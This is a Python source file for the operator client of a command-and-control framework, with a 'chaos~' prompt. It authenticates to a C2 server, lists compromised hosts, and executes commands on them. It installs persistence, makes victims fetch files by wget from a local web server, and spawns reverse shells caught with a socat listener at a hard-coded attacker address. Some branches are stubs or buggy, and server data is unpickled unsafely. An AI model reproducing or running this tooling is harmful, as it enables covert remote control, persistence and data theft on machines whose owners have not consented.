from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.shortcuts import clear
from prompt_toolkit import prompt
from datetime import datetime
from tabulate import tabulate
import subprocess
import tempfile
import pexpect
import pickle
import socket
import base64
import json
import time
import sys
import os


def find_available_port():
    temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    temp_socket.bind(('', 0))
    listen_port = temp_socket.getsockname()[1]
    temp_socket.close()
    return listen_port


class Client:
    commands = ['attach', 'clear', 'download', 'exec', 'exit', 'help', 'install', 'kill', 'list',
                'reset', 'sessions', 'shell', 'status', 'uninstall', 'upload']
    exit_codes = {-1: 'None', 0: 'Success', 1: 'Error', 2: 'Incorrect usage', 126: 'Command not executable',
                  127: 'Command not found', 129: 'SIGHUP', 130: 'SIGINT', 131: 'SIGQUIT', 132: 'SIGILL', 133: 'SIGTRAP',
                  134: 'SIGABRT/SIGIOT', 135: 'SIGBUS', 136: 'SIGFPE', 137: 'SIGKILL', 138: 'SIGUSR1', 139: 'SIGSEGV',
                  140: 'SIGUSR2', 141: 'SIGPIPE', 142: 'SIGALRM', 143: 'SIGTERM', 144: 'SIGSTKFLT', 145: 'SIGCHLD',
                  146: 'SIGCONT', 147: 'SIGSTOP', 148: 'SIGTSTP', 149: 'SIGTTIN', 150: 'SIGTTOU', 151: 'SIGURG',
                  152: 'SIGXCPU', 153: 'SIGXFSZ', 154: 'SIGVTALRM', 155: 'SIGPROF', 156: 'SIGWINCH',
                  157: 'SIGIO/SIGPOLL', 158: 'SIGPWR', 159: 'SIGSYS/SIGUNUSED'}
    help_message = """
    attach <session> *attach to a background shell session
    clear *clears the screen
    exec <host|all> <command> *executes commands on hosts.
    exit *exits the client
    download <host> <file> *tells the specified host to download a file.
    help (command) *displays help messages
    install <host|all> *installs persistence on the target host. If all is specified, install on all hosts.
    kill <session|all> *terminates a shell session. If all is specified, kills all shell sessions.
    list <hosts|sessions|status> *lists information about connected hosts
    reset *resets the terminal
    shell <host|all> *get a shell on the host. If all is specified, attempts to get a shell on all hosts.
    uninstall <host|all> *uninstall and quit the beacon on the host. If all is specified, uninstalls from all hosts.
    upload <file> <host> *uploads files to a local webserver that the specified host downloads from.
    """
    key_bindings = KeyBindings()
    db = {}
    sessions = {}  # pid:{'host': pexpect child process, ...}
    s = None
    host_map = None
    hostnames = None
    attacker_address = '192.168.102.16'
    session_number = 0
    tempdir = tempfile.TemporaryDirectory()
    webserver_port = None
    completer = None

    def __init__(self, server_addr, server_port):
        clear()
        self.server_addr = server_addr
        self.server_port = server_port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.s.connect((server_addr, server_port))
                clear()
                print(f"Connection to {server_addr}:{server_port} accepted!")
                break
            except ConnectionRefusedError:
                print(f"Connection to {server_addr}:{server_port} refused, retrying...")
                time.sleep(5)

        # Send secret message to initiate the auth process
        self.s.sendall('ODQtMjEtQTogIkkgZG9uJ3Qga25vdyBob3cgbXVjaCBsb25nZXIgSSBjYW4gZ28gb24uIEkgZG8gbm90IHdhbnQgdG8gbGl'
                       '2ZSBhbnltb3JlIGFzIHdoYXQgSSBoYXZlIGJlY29tZS4gVGhlIHJlZCBleWUgYmV5b25kIHRoZSBnYXRlIHNob3dlZCBtZS'
                       'wgbm8sIHRvdWNoZWQgbWUsIHBvaXNvbmVkIG1lLiBJdCBmZWVscyBsaWtlIG15IG1pbmQgaGFzIGJlZW4gY29udGFtaW5hd'
                       'GVkLCBkZWZpbGVkLCBieSBhbm90aGVyIHBlcnNvbidzIG1lbW9yeS4gVHMgbm8gbG9uZ2VyIGZ1bGx5IG15c2VsZiBhbnlt'
                       'b3JlLCBidXQgSSd2ZSBub3QgZnVsbHkgYmVjb21lIHNvbWVvbmUgZWxzZSBlaXRoZXIuIg=='.encode())
        print('Sent secret to the server, awaiting response...')

        # Wait for the authentication acknowledgement
        auth_ack = self.s.recv(1024)
        if base64.b64decode(auth_ack).decode() == "AUTH ACK":
            self.auth_success = True
            print("Authentication successful!")
        else:
            self.auth_success = False
            print("Authentication failed.")

        self.webserver_port = find_available_port()
        os.chdir(self.tempdir.name)  # change current working directory to the temporary directory
        subprocess.Popen(["python3", "-m", "http.server", f"{self.webserver_port}"], stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
        print(f"Web Server is running on port: {self.webserver_port}")

    @staticmethod
    @key_bindings.add('c-l')
    def _clear_screen():
        pass

    @staticmethod
    @key_bindings.add('c-d')
    def _disconnect():
        sys.exit(0)

    def send_command(self, cmd, args=None):
        request = json.dumps({'cmd': cmd, 'args': args})
        self.s.sendall(base64.b64encode(request.encode()))
        response = base64.b64decode(self.s.recv(32768))
        return response

    def _update_db(self):
        response = self.send_command('list')
        self.db = pickle.loads(response)

    def _update_hostnames(self):
        self.hostnames = []
        if self.db:
            for ip, host in self.db.items():
                self.hostnames.append(host.hostname)

    def _update_hostmap(self):
        self.host_map = {}
        if self.db:
            for ip, host in self.db.items():
                self.host_map.update({host.hostname: ip})

    def update(self):
        self._update_db()
        self._update_hostnames()
        self._update_hostmap()
        session_dict: dict = {str(session_id): None for session_id in self.sessions.keys()}
        hostname_dict: dict = {hostname: None for hostname in self.hostnames}
        command_dict: dict = {command: None for command in self.commands}
        sessions_all: dict = session_dict.copy()
        hostnames_all: dict = hostname_dict.copy()
        sessions_all.update({'all': None})
        hostnames_all.update({'all': None})
        self.completer = NestedCompleter.from_nested_dict({
            'attach': session_dict,
            'clear': None,
            'download': hostname_dict,
            'exec': hostname_dict,
            'exit': None,
            'help': command_dict,
            'install': hostnames_all if hostname_dict else None,
            'kill': sessions_all if session_dict else None,
            'list': {
                'hosts': None,
                'sessions': None,
                'status': None
            },
            'reset': None,
            'shell': hostnames_all if hostname_dict else None,
            'uninstall': hostnames_all if hostname_dict else None,
            'upload': hostname_dict
        })

    def connection_alive(self):
        try:
            error = self.s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
            if error != 0:
                return False
        except socket.error:
            return False
        return True

    def help(self, command: str = ""):
        if not command:
            return self.help_message
        else:
            match command.strip().lower():
                case 'attach':
                    pass
                case 'clear':
                    pass
                case 'download':
                    pass
                case 'exec':
                    pass
                case 'exit':
                    pass
                case 'help':
                    pass
                case 'install':
                    pass
                case 'list':
                    pass
                case 'reset':
                    pass
                case 'sessions':
                    pass
                case 'shell':
                    pass
                case 'status':
                    pass
                case 'uninstall':
                    pass
                case 'upload':
                    pass

    def list_command_status(self):
        status_table = []
        for ip, host in self.db.items():
            for _, command_info in host.cmd_history.items():
                if host.cmd_history.items():
                    status_table.append([command_info['time_executed'], host.hostname, self.exit_codes[
                        int(command_info['return_code'])], command_info['cmd']])
        if status_table:
            return tabulate(status_table, headers=["Time Executed", "Hostname", "Return Code", "Command"])
        else:
            return None

    def list_hosts(self):
        if self.db:
            host_table = []
            for ip, host in self.db.items():
                host_table.append([ip, host.hostname, host.last_seen.strftime('%m-%d %H:%M:%S')])
            return tabulate(host_table, headers=["IP Address", "Hostname", "Last Seen"])
        else:
            return None

    def list_sessions(self):
        # sessions = {} -> pid:{'host': hostname, 'spawn_time': datetime.now, 'process': pexpect.spawn ...}
        session_table = []
        for session_id, session_info in self.sessions.items():
            session_table.append([session_id, session_info['hostname'], session_info['spawn_time']])
        if session_table:
            return tabulate(session_table, headers=["ID", "Hostname", "Active Since"])
        else:
            return None

    def client_loop(self):
        history = InMemoryHistory()
        preset_command = False
        command = ''
        while self.connection_alive():
            self.update()
            if not preset_command:
                command = prompt("chaos~ ", history=history, key_bindings=self.key_bindings,
                                 completer=self.completer).split(' ')
            else:
                preset_command = False
            self.update()
            match command[0].lower().strip():
                case 'help':
                    print(self.help_message)
                case 'clear':
                    clear()
                case 'list':
                    if len(command) > 1:
                        table = None
                        match command[1].lower().strip():
                            case 'hosts':
                                table = self.list_hosts()
                            case 'sessions':
                                table = self.list_sessions()
                            case 'status':
                                table = self.list_command_status()
                            case _:
                                print('Invalid argument.')
                        if table:
                            clear()
                            print(table)
                        else:
                            print('Nothing to list!')
                    else:
                        print(f'Usage: list <commands|hosts|sessions>')
                case 'exec':
                    print("(Exec Mode) Syntax: <hostname> <command>")
                    hostname = command[0]
                    if hostname in self.hostnames:
                        address = self.host_map.get(hostname)
                        self.send_command('exec', f"{address} "
                                                  f"{str(' '.join(command[1:]))}")
                    else:
                        print("No such host exists...")
                        break
                case 'download':
                    hostname = command[1]
                    url = command[2]
                    if hostname in self.hostnames:
                        beacon_address = self.host_map.get(hostname)
                        self.send_command('download', f"{beacon_address} {url}")
                    else:
                        print('No such host exists...')
                case 'upload':
                    hostname = command[1]
                    file = command[2]
                    if os.path.isfile(file) and hostname in self.hostnames:
                        os.system(f'cp {file} {self.tempdir.name}')
                        preset_command = True
                        command = ['exec', hostname, f'wget http://{c2_server_address}:{self.webserver_port}'
                                                     f'/{os.path.basename(file)}']
                    else:
                        print(f'Invalid host \'{hostname}\' or \'{file}\' does not exist.')
                case 'reset':
                    os.system('reset')
                case 'kill':
                    session_id = command[1]
                    kill_list = []
                    try:
                        session_id = int(session_id)
                        if session_id in self.sessions:
                            session = self.sessions[session_id]['process']
                            session.sendcontrol('d')
                            kill_list.append(session_id)
                            print(f'Session {session_id} killed.')
                    except ValueError:
                        if session_id == 'all':
                            for session_id, session_info in self.sessions.items():
                                session = session_info['process']
                                session.sendcontrol('d')
                                kill_list.append(session_id)
                                print(f'Session {session_id} killed.')
                        else:
                            print(f"'{session_id}' is not a valid session")
                    for session_id in kill_list:
                        del self.sessions[session_id]
                case 'attach':
                    session_number = int(command[1])
                    if session_number in self.sessions:
                        print(f'Attaching to session {session_number}...')
                        child = self.sessions[session_number]['process']
                        while True:
                            try:
                                index = child.expect(['exit', pexpect.EOF, pexpect.TIMEOUT],
                                                     timeout=1)  # add your exit command here
                                if index == 0:  # if 'exit' command is received
                                    child.sendcontrol('d')  # sends EOF to child process
                                    break
                                elif index == 1:  # if EOF is received
                                    break
                                elif index == 2:  # if nothing is received for a set timeout
                                    child.interact()  # gives control of the child process
                            except KeyboardInterrupt:
                                print("Exiting shell session.")
                                os.system('reset')
                                break
                        del self.sessions[session_number]
                    else:
                        print(f"'{session_number}' is not a valid session")
                case 'sessions':
                    pass
                case 'shell':
                    hostname = command[1]
                    if hostname in self.hostnames:
                        self.session_number = self.session_number + 1
                        terminal_size = os.get_terminal_size()
                        print('Starting reverse shell listener...')
                        print(f'Terminal size: {terminal_size.lines}x{terminal_size.columns}')
                        print(f'Resize terminal with `resize -s {terminal_size.lines} {terminal_size.columns}`.')
                        listen_port = find_available_port()
                        address = self.host_map.get(hostname)
                        self.send_command('shell', f'{address} {self.attacker_address} {listen_port}')
                        child = pexpect.spawn(f'/bin/bash -c "socat file:`tty`,raw,echo=0 tcp-listen:{listen_port}"')
                        self.sessions[self.session_number] = {'hostname': hostname,
                                                              'spawn_time': datetime.now().strftime('%m-%d %H:%M:%S'),
                                                              'process': child}
                        preset_command = True
                        command = ['attach', self.session_number]
                    elif hostname == 'all':
                        for hostname in self.hostnames:
                            self.session_number = self.session_number + 1
                            address = self.host_map.get(hostname)
                            listen_port = find_available_port()
                            self.send_command('shell', f'{address} {self.attacker_address} {listen_port}')
                            print(f'Starting reverse shell listener for host {hostname}...')
                            child = pexpect.spawn(
                                f'/bin/bash -c "socat file:`tty`,raw,echo=0 tcp-listen:{listen_port}"')
                            self.sessions[self.session_number] = {'hostname': hostname,
                                                                  'spawn_time': datetime.now().strftime(
                                                                      '%m-%d %H:%M:%S'),
                                                                  'process': child}
                    else:
                        print("No such host exists...")

                case 'status':
                    if self.db:
                        pass
                    else:
                        print("No hosts available.")
                case 'install' | 'uninstall':
                    command_name = command[0]
                    if len(command) > 1:
                        hostname = command[1]
                        if hostname in self.hostnames:
                            address = self.host_map.get(hostname)
                            self.send_command(command[0].lower(), f'{address}')
                        elif hostname == 'all':
                            for hostname in self.hostnames:
                                address = self.host_map.get(hostname)
                                self.send_command(command[0].lower(), f'{address}')
                        else:
                            print("No such host exists...")
                    else:
                        print(f'Usage: {command_name} <host|all>')
                case 'exit':
                    self.s.close()
                    sys.exit(0)


if __name__ == "__main__":
    c2_server_address = '192.168.102.16'
    c2_server_port = 1337
    while True:
        client = Client(c2_server_address, c2_server_port)
        try:
            client.client_loop()
        except EOFError:
            client.s.close()
            client.tempdir.cleanup()
            print('Disconnected from C2 server. Reconnecting...')
            time.sleep(1)
        except KeyboardInterrupt:
            client.s.close()
            client.tempdir.cleanup()
            sys.exit(130)
